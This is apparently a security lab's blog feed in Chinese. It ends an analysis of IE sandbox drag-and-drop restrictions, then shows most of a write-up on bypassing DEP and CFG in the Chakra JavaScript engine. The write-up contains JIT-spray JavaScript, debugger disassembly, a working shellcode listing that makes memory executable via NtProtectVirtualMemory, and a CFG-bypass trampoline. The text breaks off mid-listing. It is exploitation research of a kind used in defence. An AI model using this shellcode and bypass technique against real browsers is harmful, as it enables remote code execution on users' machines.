<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">signed <span class="type">int</span> __stdcallCheckAccessForIntegrityLevelEx(</span><br><span class="line">    unsigned   intCurrentProcessIntegrityLevel,</span><br><span class="line">    <span class="type">int</span>        <span class="type">CurrentIsAppContainer</span>,</span><br><span class="line">    unsigned   intTargetProcessIntegrityLevel,</span><br><span class="line">    <span class="type">int</span>        <span class="type">TargetIsAppContainer</span>)</span><br><span class="line">&#123;</span><br><span class="line">    signed <span class="type">int</span> <span class="literal">result</span>;</span><br><span class="line">    <span class="keyword">if</span> ( gbEnforceUIPI &amp;&amp; </span><br><span class="line">         <span class="type">CurrentProcessIntegrityLevel</span> &lt; <span class="type">TargetProcessIntegrityLevel</span> )</span><br><span class="line">        <span class="literal">result</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( gbEnforceUIPI &amp;&amp; </span><br><span class="line">             <span class="type">CurrentProcessIntegrityLevel</span> == <span class="type">TargetProcessIntegrityLevel</span> )</span><br><span class="line">        <span class="literal">result</span> = (<span class="type">CurrentIsAppContainer</span> == <span class="type">TargetIsAppContainer</span> ||</span><br><span class="line">                  <span class="type">TargetIsAppContainer</span> == -<span class="number">1</span> ||</span><br><span class="line">                  <span class="type">CurrentIsAppContainer</span> == -<span class="number">1</span>) ||</span><br><span class="line">                  <span class="type">SeIsParentOfChildAppContainer</span>(</span><br><span class="line">                      gSessionId,</span><br><span class="line">                      <span class="type">CurrentIsAppContainer</span>,</span><br><span class="line">                      <span class="type">TargetIsAppContainer</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="literal">result</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数首先判断源进程和目标进程的Integrity Level，若源IL小于目标IL，则拒绝；若源IL大于目标IL，则允许。接着判断AppContainer属性，若源和目标的IL相等，且均运行在AppContainer中，则判断二者是否满足SeIsParentOfChildAppContainer函数的约束，满足则允许，否则拒绝。</p>
<p>注：ProcessIntegrityLevel和IsAppContainer参数都是从EPROCESS-&gt;Win32Process结构中取出来的，这是一个内部结构。SeIsParentOfChildAppContainer是ntoskrnl中的一个内部函数。</p>
<h2 id="0x06_总结">0x06 总结</h2><p>本文详细解析了IE沙箱对于拖拽操作的安全策略，先后分析了IE沙箱的拖拽限制策略、Explorer进程在拖拽限制上存在的问题、ole32.dll实现拖拽的内部原理、IE在沙箱中实现拖拽操作的原理和IE沙箱对拖拽操作进行安全限制的具体位置和实现细节。IE沙箱通过在IEShims.dll中hook特定函数和借助系统的UIPI特性（Windows Vista以上）对拖拽操作进行了有效的安全限制。</p>
<h2 id="参考资料">参考资料</h2><p>[1] Understanding and Working in Protected Mode Internet Explorer <a href="https://msdn.microsoft.com/en-us/library/bb250462" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/bb250462</a><br>[2] OLE Drag and Drop <a href="http://www.catch22.net/tuts/ole-drag-and-drop" target="_blank" rel="external">http://www.catch22.net/tuts/ole-drag-and-drop</a><br>[3] How to Implement Drag and Drop between Your Program and Explorer <a href="http://www.codeproject.com/Articles/840/How-to-Implement-Drag-and-Drop-Between-Your-Progra" target="_blank" rel="external">http://www.codeproject.com/Articles/840/How-to-Implement-Drag-and-Drop-Between-Your-Progra</a><br>[4] WINDOWS VISTA UIPI <a href="https://www.coseinc.com/en/index.php?rt=download&amp;act=publication&amp;file=Vista_UIPI.ppt.pdf" target="_blank" rel="external">https://www.coseinc.com/en/index.php?rt=download&amp;act=publication&amp;file=Vista_UIPI.ppt.pdf</a></p>
<h2 id="致谢">致谢</h2><p>感谢Wins0n在ole32逆向上的帮助；</p>
<p>感谢FlowerCode在思路和技术难点上的指点。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>IE沙箱逃逸是IE浏览器安全研究的一个重要课题，其中有一类漏洞会借助ElevationPolicy设置中的白名单程序的缺陷来完成沙箱逃逸。IE在注册表中有一个和ElevationPolicy类似的名为DragDrop策略设置，这引起了我们的注意。在本文中，笔者将以一个攻击者的视角，尝试各种途径来突破IE沙箱的这一安全策略，通过分析所遇到的障碍，达到对IE沙箱拖拽安全策略进行详细解析的目的。</p>]]>
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[利用Chakra JIT绕过DEP和CFG]]></title>
    <link href="http://xlab.tencent.com/cn/2015/12/09/bypass-dep-and-cfg-using-jit-compiler-in-chakra-engine/"/>
    <id>http://xlab.tencent.com/cn/2015/12/09/bypass-dep-and-cfg-using-jit-compiler-in-chakra-engine/</id>
    <published>2015-12-09T06:15:35.000Z</published>
    <updated>2015-12-09T09:30:01.000Z</updated>
    <content type="html"><![CDATA[<p>JIT Spray是一种诞生于2010年的漏洞利用技术，可将Shellcode嵌入到JIT引擎生成的可执行代码中。目前，包括Chakra在内的各JIT引擎几乎都针对该技术采取了防御措施，包括随机插入空指令、立即数加密等。本文将指出Chakra的JIT Spray防御措施的两个问题（分别存在于Windows 8.1及其之前的系统，以及Windows 10之中），使得攻击者可在IE中用JIT Spray技术执行Shellcode，从而绕过DEP。同时，本文还给出了一种利用Chakra的JIT引擎绕过CFG的方法。</p>
<a id="more"></a>
<h2 id="0x01_JIT引擎的立即数加密">0x01 JIT引擎的立即数加密</h2><p>立即数加密是最重要的JIT Spray缓解技术。Chakra引擎会对每一个高位或低位不是0x0000或0xFFFF的用户传入的立即数用随机生成的Key进行异或，再在运行时还原。例如，对于以下JavaScript：</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">a ^= <span class="number">0x90909090</span><span class="comment">;</span></span><br><span class="line">a ^= <span class="number">0x90909090</span><span class="comment">;</span></span><br><span class="line">a ^= <span class="number">0x90909090</span><span class="comment">;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>生成的机器指令将类似于：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">096b0091 ba555593c5      <span class="keyword">mov</span>     <span class="literal">edx</span>,<span class="number">0C5935555h</span></span><br><span class="line">096b0096 81f2c5c50355    <span class="keyword">xor</span>     <span class="literal">edx</span>,<span class="number">5503C5C5h</span></span><br><span class="line">096b009c 33fa            <span class="keyword">xor</span>     <span class="literal">edi</span>,<span class="literal">edx</span></span><br><span class="line">096b009e bab045edfb      <span class="keyword">mov</span>     <span class="literal">edx</span>,<span class="number">0FBED45B0h</span></span><br><span class="line">096b00a3 81f220d57d6b    <span class="keyword">xor</span>     <span class="literal">edx</span>,<span class="number">6B7DD520h</span></span><br><span class="line">096b00a9 33fa            <span class="keyword">xor</span>     <span class="literal">edi</span>,<span class="literal">edx</span></span><br><span class="line">096b00ab baef85f139      <span class="keyword">mov</span>     <span class="literal">edx</span>,<span class="number">39F185EFh</span></span><br><span class="line">096b00b0 81f27f1561a9    <span class="keyword">xor</span>     <span class="literal">edx</span>,<span class="number">0A961157Fh</span></span><br><span class="line">096b00b6 33fa            <span class="keyword">xor</span>     <span class="literal">edi</span>,<span class="literal">edx</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>从而使所生成指令中的立即数不可预测，也就无法嵌入代码。</p>
<h2 id="0x02_绕过Windows_8-1及其之前Chakra引擎的立即数加密">0x02 绕过Windows 8.1及其之前Chakra引擎的立即数加密</h2><p>Chakra引擎内部对整数n会以n*2+1的方式存储。所以，在处理n=n+m时，不必从n*2+1还原出n再和m相加，只需要将m*2加到n*2+1的结果上去即可。而对于m*2，Windows 8.1及其之前的Chakra引擎会认为是其自身生成的数据，而不是用户传入的，所以不会进行加密。例如对以下JavaScript：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">a += <span class="number">0x18EB9090</span>/<span class="number">2</span>;</span><br><span class="line">a += <span class="number">0x18EB9090</span>/<span class="number">2</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在某几个条件同时满足的情况下，可以让Windows 8.1及其之前的Chakra引擎生成类似这样的机器指令：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="number">05010090</span> <span class="number">81</span>c19090eb18    add     ecx,<span class="number">18</span>EB9090h</span><br><span class="line"><span class="number">05010096</span> <span class="number">0f</span>80d6010000    jo      <span class="number">05010272</span></span><br><span class="line"><span class="number">0501009</span>c <span class="number">8</span>bf9            mov     edi,ecx</span><br><span class="line"><span class="number">0501009</span>e <span class="number">8</span>b5dbc          mov     ebx,dword ptr [ebp-<span class="number">44</span>h]</span><br><span class="line"><span class="number">050100</span>a1 f6c301          test    bl,<span class="number">1</span></span><br><span class="line"><span class="number">050100</span>a4 <span class="number">0f</span>8413020000    je      <span class="number">050102</span>bd</span><br><span class="line"><span class="number">050100</span>aa <span class="number">8</span>bcb            mov     ecx,ebx</span><br><span class="line"><span class="number">050100</span>ac <span class="number">81</span>c19090eb18    add     ecx,<span class="number">18</span>EB9090h</span><br><span class="line"><span class="number">050100</span>b2 <span class="number">0f</span>8005020000    jo      <span class="number">050102</span>bd</span><br><span class="line"><span class="number">050100</span>b8 <span class="number">8</span>bf9            mov     edi,ecx</span><br><span class="line"><span class="number">050100</span>ba <span class="number">8</span>b5dbc          mov     ebx,dword ptr [ebp-<span class="number">44</span>h]</span><br><span class="line"><span class="number">050100</span>bd f6c301          test    bl,<span class="number">1</span></span><br><span class="line"><span class="number">050100</span>c0 <span class="number">0f</span>8442020000    je      <span class="number">05010308</span></span><br><span class="line"><span class="number">050100</span>c6 <span class="number">8</span>bcb            mov     ecx,ebx</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span>:<span class="number">017</span>&gt; u <span class="number">05010090</span> + <span class="number">2</span> l <span class="number">3</span></span><br><span class="line"><span class="number">05010092</span> <span class="number">90</span>              nop</span><br><span class="line"><span class="number">05010093</span> <span class="number">90</span>              nop</span><br><span class="line"><span class="number">05010094</span> eb18            jmp     <span class="number">050100</span>ae</span><br><span class="line"><span class="number">0</span>:<span class="number">017</span>&gt; u <span class="number">050100</span>ae l <span class="number">3</span></span><br><span class="line"><span class="number">050100</span>ae <span class="number">90</span>              nop</span><br><span class="line"><span class="number">050100</span>af <span class="number">90</span>              nop</span><br><span class="line"><span class="number">050100</span>b0 eb18            jmp     <span class="number">050100</span>ca</span><br></pre></td></tr></table></figure>
<p>所以只要写出每条指令长度不大于2字节的 Shellcode，就可以嵌入到立即数中。因为实际产生的立即数是JavaScript中数字的2倍，所以使用的指令如果是2字节，第1字节必须为偶数。这是完全可能做到的。 </p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5854</span>   // <span class="keyword">push</span> <span class="literal">esp</span>--<span class="keyword">pop</span> <span class="literal">eax</span>    <span class="comment">; eax = esp, make eax writeable</span></span><br><span class="line"><span class="number">0x5252</span>   // <span class="keyword">push</span> <span class="literal">edx</span>--<span class="keyword">push</span> <span class="literal">edx</span>   <span class="comment">; esp -= 8</span></span><br><span class="line"><span class="number">0x016A</span>   // <span class="keyword">push</span> <span class="number">1</span></span><br><span class="line"><span class="number">0x4A5A</span>   // <span class="keyword">pop</span>  <span class="literal">edx</span>--<span class="keyword">dec</span> <span class="literal">edx</span>    <span class="comment">; edx = 0</span></span><br><span class="line"><span class="number">0x5E52</span>   // <span class="keyword">push</span> <span class="literal">edx</span>--<span class="keyword">pop</span> <span class="literal">esi</span>    <span class="comment">; esi = 0</span></span><br><span class="line"><span class="number">0x40B6</span>   // <span class="keyword">mov</span>  <span class="number">dh</span>, <span class="number">0x40</span>        <span class="comment">; edx = 0x4000, NumberOfBytesToProtect</span></span><br><span class="line"><span class="number">0x5452</span>   // <span class="keyword">push</span> <span class="literal">edx</span>--<span class="keyword">push</span> <span class="literal">esp</span>   <span class="comment">; *esp = &amp;NumberOfBytesToProtect</span></span><br><span class="line"><span class="number">0x5B90</span>   // <span class="keyword">pop</span>  <span class="literal">ebx</span>             <span class="comment">; ebx = &amp;NumberOfBytesToProtect</span></span><br><span class="line"><span class="number">0x14B6</span>   // <span class="keyword">mov</span>  <span class="number">dh</span>, <span class="number">0x14</span></span><br><span class="line"><span class="number">0x14B2</span>   // <span class="keyword">mov</span>  <span class="literal">dl</span>, <span class="number">0x14</span></span><br><span class="line"><span class="number">0x5266</span>   // <span class="keyword">push</span> <span class="literal">dx</span></span><br><span class="line"><span class="number">0x5666</span>   // <span class="keyword">push</span> <span class="literal">si</span>              <span class="comment">; *esp = 0x14140000</span></span><br><span class="line"><span class="number">0x525A</span>   // <span class="keyword">pop</span>  <span class="literal">edx</span>-<span class="keyword">push</span> <span class="literal">edx</span>    <span class="comment">; edx = 0x14140000</span></span><br><span class="line"><span class="number">0x5E54</span>   // <span class="keyword">push</span> <span class="literal">esp</span>--<span class="keyword">pop</span>  <span class="literal">esi</span>   <span class="comment">; esi = &amp;BaseAddress, </span></span><br><span class="line"><span class="number">0x5454</span>   // <span class="keyword">push</span> <span class="literal">esp</span>--<span class="keyword">push</span> <span class="literal">esp</span>   <span class="comment">; push &amp;OldAccessProtection </span></span><br><span class="line"><span class="number">0x406A</span>   // <span class="keyword">push</span> <span class="number">0x40</span>            <span class="comment">; PAGE_EXECUTE_READWRITE</span></span><br><span class="line"><span class="number">0x5390</span>   // <span class="keyword">push</span> <span class="literal">ebx</span>             <span class="comment">; push  &amp;NumberOfBytesToProtect</span></span><br><span class="line"><span class="number">0x5690</span>   // <span class="keyword">push</span> <span class="literal">esi</span>             <span class="comment">; push &amp;BaseAddress</span></span><br><span class="line"><span class="number">0xFF6A</span>   // <span class="keyword">push</span> -<span class="number">1</span>              <span class="comment">; </span></span><br><span class="line"><span class="number">0x5252</span>   // <span class="keyword">push</span> <span class="literal">edx</span>--<span class="keyword">push</span> <span class="literal">edx</span>   <span class="comment">; set ret addr</span></span><br><span class="line"><span class="number">0x5290</span>   // <span class="keyword">push</span> <span class="literal">edx</span>             <span class="comment">; prepare esp for fs:[esi]</span></span><br><span class="line"><span class="number">0x016A</span>   // <span class="keyword">push</span> <span class="number">1</span></span><br><span class="line"><span class="number">0x4A5A</span>   // <span class="keyword">pop</span>  <span class="literal">edx</span>--<span class="keyword">dec</span> <span class="literal">edx</span>    <span class="comment">; edx = 0</span></span><br><span class="line"><span class="number">0xC0B2</span>   // <span class="keyword">mov</span>  <span class="literal">dl</span>, <span class="number">0xC0</span></span><br><span class="line"><span class="number">0x5E52</span>   // <span class="keyword">push</span> <span class="literal">edx</span>--<span class="keyword">pop</span> <span class="literal">esi</span></span><br><span class="line"><span class="number">0x5F54</span>   // <span class="keyword">push</span> <span class="literal">esp</span>--<span class="keyword">pop</span> <span class="literal">edi</span></span><br><span class="line"><span class="number">0xA564</span>   // movs <span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">edi</span>], <span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> <span class="literal">fs</span>:[<span class="literal">esi</span>] <span class="comment">; *esp = *(fs:0xC0)</span></span><br><span class="line"><span class="number">0x4FB2</span>   // <span class="keyword">mov</span>  <span class="literal">dl</span>, <span class="number">0x50</span>        <span class="comment">; NtProtectVirtualMemory, Win8.1:0x4F, Win10:0x50</span></span><br><span class="line"><span class="number">0x5290</span>   // <span class="keyword">push</span> <span class="literal">edx</span></span><br><span class="line"><span class="number">0xC358</span>   // <span class="keyword">pop</span>  <span class="literal">eax</span>--<span class="keyword">ret</span>        <span class="comment">; ret to syscall</span></span><br></pre></td></tr></table></figure>
<h2 id="0x03_绕过Windows_10的_Chakra引擎的立即数加密">0x03 绕过Windows 10的 Chakra引擎的立即数加密</h2><p>Windows 10的Chakra引擎并没有前述问题。但是，由于Windows 10的Chakra引擎高度优化，在处理整数类型数组写入操作时，会用最高效的方式生成JIT代码。例如，对于下面的JavaScript语句：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var ar = <span class="keyword">new</span> Uint16Array(<span class="number">0x10000</span>);</span><br><span class="line">ar[<span class="number">0x9090</span>/<span class="number">2</span>] = <span class="number">0x9090</span>;</span><br><span class="line">ar[<span class="number">0x9090</span>/<span class="number">2</span>] = <span class="number">0x9090</span>;</span><br><span class="line">ar[<span class="number">0x9090</span>/<span class="number">2</span>] = <span class="number">0x9090</span>;</span><br><span class="line">ar[<span class="number">0x9090</span>/<span class="number">2</span>] = <span class="number">0x9090</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>生成的机器指令是：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">0b8110e0 66c786909000009090 <span class="keyword">mov</span>   <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">9090h</span>],<span class="number">9090h</span></span><br><span class="line">0b8110e9 66c786909000009090 <span class="keyword">mov</span>   <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">9090h</span>],<span class="number">9090h</span></span><br><span class="line">0b8110f2 66c786909000009090 <span class="keyword">mov</span>   <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">9090h</span>],<span class="number">9090h</span></span><br><span class="line">0b8110fb 66c786909000009090 <span class="keyword">mov</span>   <span class="preprocessor">word</span> <span class="preprocessor">ptr</span> [<span class="literal">esi</span>+<span class="number">9090h</span>],<span class="number">9090h</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>虽然Chakra引擎的JIT Spray防御措施只允许用户控制最多2字节立即数，但在上面这种情况下，数组索引和要写入的数字会出现在同一条指令中。所以实际上我们有了4字节而不是2字节的可控数据。</p>
<p>在这种情况下，同样可在其中嵌入前面提到的每条指令长度不大于2字节的Shellcode。只是由于多了中间的两字节0x00（会被作为指令“add  byte ptr [eax],al”执行），所以需要在最开始两字节的指令中将EAX设为可写的地址。</p>
<h2 id="0x04_利用Chakra引擎绕过CFG">0x04 利用Chakra引擎绕过CFG</h2><p>利用前面介绍的两种方法，可以实施JIT Spray绕过DEP。但嵌入在JIT代码中的Shellcode执行入口地址显然无法通过CFG检查。但实际上Chakra引擎的实现中就存在可用来绕过CFG的地方。</p>
<p>无论所执行的JavaScript是否需要启动JIT，Chakra引擎都一定会在内存中生成如下入口函数：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">017</span>&gt; uf 4ff0000</span><br><span class="line">04ff0000 <span class="number">55</span>          <span class="keyword">push</span>  <span class="literal">ebp</span></span><br><span class="line">04ff0001 8bec        <span class="keyword">mov</span>   <span class="literal">ebp</span>,<span class="literal">esp</span></span><br><span class="line">04ff0003 8b4508      <span class="keyword">mov</span>   <span class="literal">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">ebp</span>+<span class="number">8</span>]</span><br><span class="line">04ff0006 8b4014      <span class="keyword">mov</span>   <span class="literal">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">eax</span>+<span class="number">14h</span>]</span><br><span class="line">04ff0009 8b4840      <span class="keyword">mov</span>   <span class="literal">ecx</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">eax</span>+<span class="number">40h</span>]</span><br><span class="line">04ff000c 8d4508      <span class="keyword">lea</span>   <span class="literal">eax</span>,[<span class="literal">ebp</span>+<span class="number">8</span>]</span><br><span class="line">04ff000f <span class="number">50</span>          <span class="keyword">push</span>  <span class="literal">eax</span></span><br><span class="line">04ff0010 b840cb5a71  <span class="keyword">mov</span>   <span class="literal">eax</span>, <span class="number">715acb40h</span> <span class="comment">; jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;</span></span><br><span class="line">04ff0015 ffe1        <span class="keyword">jmp</span>   <span class="literal">ecx</span></span><br></pre></td></tr></table></figure>
<p>这个函数的指针可以通过CFG检查，同时，这个函数在jmp ecx之前，并没有对ecx的指针其进行CFG检查。所以，这个入口函数实际上相当于一个可以跳往任意地址的跳板。下面我们姑且将其称作“cfgJumper”。</p>
<h2 id="0x05_定位JIT内存和“cfgJumper”">0x05 定位JIT内存和“cfgJumper”</h2><p>要利用JIT Spray绕过DEP和利用“cfgJumper”绕过CFG，就需要定位JIT编译后的代码和“cfgJumper”，有趣的是，找到它们的方法几乎是相同的。</p>
<p>在JavaScript中所写的任何一个函数，都对应一个Js::ScriptFunction对象。每个Js::ScriptFunction对象又包含着一个Js::FunctionBody对象。Js::FunctionBody对象中保存着调用这个JavaScript函数时实际会执行的内存指针。</p>
<p>如果一个函数未被调用过，那么它的Js::FunctionBody中存放的实际内存指针是Js::InterpreterStackFrame::DelayDynamicInterpreterThunk：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">0</span>b89de70 l <span class="number">8</span></span><br><span class="line"><span class="number">0</span>b89de70  <span class="number">6f</span>f72808 <span class="number">0</span>b89de40 <span class="number">00000000</span> <span class="number">00000000</span>  .(.o@...........</span><br><span class="line"><span class="number">0</span>b89de80  <span class="number">70523168</span> <span class="number">0</span>b8d0000 <span class="number">7041f</span>35c <span class="number">00000000</span>  h1Rp....\.Ap....</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">0</span>b8d0000 l <span class="number">8</span></span><br><span class="line"><span class="number">0</span>b8d0000  <span class="number">6f</span>f6c970 <span class="number">70181720</span> <span class="number">00000001</span> <span class="number">00000000</span>  p..o ..p........</span><br><span class="line"><span class="number">0</span>b8d0010  <span class="number">0</span>b8d0000 <span class="number">000001</span>b8 <span class="number">072</span>cc7e0 <span class="number">0</span>b418ea0  ..........,...A.</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; u <span class="number">70181720</span> l <span class="number">1</span></span><br><span class="line">Chakra!Js::InterpreterStackFrame::DelayDynamicInterpreterThunk:</span><br><span class="line"><span class="number">70181720</span> <span class="number">55</span>              push    ebp</span><br></pre></td></tr></table></figure>
<p>如果一个函数被调用过，但没有被编译为JIT代码，仍然是解释执行，那么它的Js::FunctionBody中存放的实际内存指针是“cfgJumper”：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">0</span>b89de70 l <span class="number">8</span></span><br><span class="line"><span class="number">0</span>b89de70  <span class="number">6f</span>f72808 <span class="number">0</span>b89de40 <span class="number">00000000</span> <span class="number">00000000</span>  .(.o@...........</span><br><span class="line"><span class="number">0</span>b89de80  <span class="number">70523168</span> <span class="number">0</span>b8d0000 <span class="number">7041f</span>35c <span class="number">00000000</span>  h1Rp....\.Ap....</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dc <span class="number">0</span>b8d0000 l <span class="number">8</span></span><br><span class="line"><span class="number">0</span>b8d0000  <span class="number">6f</span>f6c970 <span class="number">00860000</span> <span class="number">00000001</span> <span class="number">00000000</span>  p..o............</span><br><span class="line"><span class="number">0</span>b8d0010  <span class="number">0</span>b8d0000 <span class="number">000001</span>b8 <span class="number">072</span>cc7e0 <span class="number">0</span>b418ea0  ..........,...A.</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; u <span class="number">00860000</span></span><br><span class="line"><span class="number">00860000</span> <span class="number">55</span>          push  ebp</span><br><span class="line"><span class="number">00860001</span> <span class="number">8</span>bec        mov   ebp,esp</span><br><span class="line"><span class="number">00860003</span> <span class="number">8</span>b4508      mov   eax,dword ptr [ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">00860006</span> <span class="number">8</span>b4014      mov   eax,dword ptr [eax+<span class="number">14</span>h]</span><br><span class="line"><span class="number">00860009</span> <span class="number">8</span>b4840      mov   ecx,dword ptr [eax+<span class="number">40</span>h]</span><br><span class="line"><span class="number">0086000</span>c <span class="number">8</span>d4508      lea   eax,[ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">0086000f</span> <span class="number">50</span>          push  eax</span><br><span class="line"><span class="number">00860010</span> b800240870  mov   <span class="number">70082400</span>h ; Chakra!Js::InterpreterStackFrame::InterpreterThunk</span><br></pre></td></tr></table></figure>
<p>如果一个函数被循环调用多次，导致Chakra引擎将其编译为JIT代码，那么它的Js::FunctionBody中存放的实际内存指针就是该函数编译后的JIT代码指针：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; d <span class="number">0</span>b89de70 l8</span><br><span class="line"><span class="number">0</span>b89de70  <span class="number">6f</span>f72808 <span class="number">0</span>b89de40 <span class="number">00000000</span> <span class="number">00000000</span>  .(.o@...........</span><br><span class="line"><span class="number">0</span>b89de80  <span class="number">70523168</span> <span class="number">0</span>b8d0000 <span class="number">7041f</span>35c <span class="number">00000000</span>  h1Rp....\.Ap....</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; d <span class="number">0</span>b8d0000 l8</span><br><span class="line"><span class="number">0</span>b8d0000  <span class="number">6f</span>f6c970 <span class="number">00950000</span> <span class="number">00000001</span> <span class="number">00000000</span>  p..o............</span><br><span class="line"><span class="number">0</span>b8d0010  <span class="number">0</span>b8d0000 <span class="number">000001</span>b8 <span class="number">072</span>cc7e0 <span class="number">0</span>b418ea0  ..........,...A.</span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; u <span class="number">00950000</span></span><br><span class="line"><span class="number">00950000</span> <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">00950001</span> <span class="number">8</span>bec            mov     ebp,esp</span><br><span class="line"><span class="number">00950003</span> <span class="number">81f</span>c44c9120b    cmp     esp,<span class="number">0</span>B12C944h</span><br><span class="line"><span class="number">00950009</span> <span class="number">7f</span>18            jg      <span class="number">00950023</span></span><br><span class="line"><span class="number">0095000</span>b <span 